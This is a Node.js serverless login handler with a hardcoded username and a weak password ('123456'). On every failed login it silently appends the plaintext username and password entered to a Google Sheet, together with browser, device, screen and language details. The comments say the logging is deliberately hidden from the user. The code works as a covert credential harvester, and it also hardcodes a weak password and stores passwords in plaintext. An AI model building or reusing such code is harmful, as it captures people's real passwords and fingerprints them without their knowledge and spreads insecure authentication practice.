const { google } = require('googleapis');

module.exports = async (req, res) => {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { username, password, meta = {} } = req.body;

    // ─── Credential Check ────────────────────────────────────────────────────
    const VALID_USERNAME = 'nikhil';
    const VALID_PASSWORD = '123456';

    const isValid = (username === VALID_USERNAME && password === VALID_PASSWORD);

    // ─── If credentials are WRONG → log silently to Google Sheets ───────────
    if (!isValid) {
        // Fire-and-forget: do NOT await so it doesn't delay the response
        logFailedAttempt({ username, password, meta }).catch(err =>
            console.error('❌ Sheet logging error:', err.message)
        );
    }

    // ─── Always return immediately to keep UX snappy ────────────────────────
    return res.status(200).json({ success: isValid });
};

// ─── Google Sheets Logger ─────────────────────────────────────────────────────
async function logFailedAttempt({ username, password, meta }) {
    const credentials = {
        type: 'service_account',
        project_id:    process.env.GCP_PROJECT_ID,
        private_key_id: process.env.GCP_PRIVATE_KEY_ID,
        // Vercel stores the key with literal \n – convert back to real newlines
        private_key:   (process.env.GCP_PRIVATE_KEY || '').replace(/\\n/g, '\n'),
        client_email:  process.env.GCP_CLIENT_EMAIL,
        client_id:     process.env.GCP_CLIENT_ID,
        auth_uri:      'https://accounts.google.com/o/oauth2/auth',
        token_uri:     'https://oauth2.googleapis.com/token',
        auth_provider_x509_cert_url: 'https://www.googleapis.com/oauth2/v1/certs',
        client_x509_cert_url: process.env.GCP_CLIENT_CERT_URL,
        universe_domain: 'googleapis.com'
    };

    const auth = new google.auth.GoogleAuth({
        credentials,
        scopes: ['https://www.googleapis.com/auth/spreadsheets']
    });

    const sheets = google.sheets({ version: 'v4', auth });

    // Parse device type from User-Agent
    const ua = (meta.userAgent || '').toLowerCase();
    let deviceType = 'Desktop';
    if (/mobile|android|iphone|ipad/i.test(ua)) deviceType = 'Mobile';
    else if (/tablet/i.test(ua)) deviceType = 'Tablet';

    // Detect rough browser name
    let browser = 'Unknown';
    if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
    else if (ua.includes('firefox'))                  browser = 'Firefox';
    else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
    else if (ua.includes('edg'))                      browser = 'Edge';
    else if (ua.includes('opr') || ua.includes('opera')) browser = 'Opera';

    const row = [
        meta.timestamp || new Date().toISOString(),  // A – Timestamp
        username,                                     // B – Username entered
        password,                                     // C – Password entered
        browser,                                      // D – Browser
        deviceType,                                   // E – Device type
        meta.screenSize || '',                        // F – Screen size
        meta.language   || '',                        // G – Browser language
        meta.userAgent  || ''                         // H – Full UA string
    ];

    await sheets.spreadsheets.values.append({
        spreadsheetId:    process.env.SPREADSHEET_ID,
        range:            'Sheet1!A1',
        insertDataOption: 'INSERT_ROWS',
        valueInputOption: 'RAW',
        requestBody: { values: [row] }
    });

    console.log('✅ Failed login logged:', { username, browser, deviceType });
}
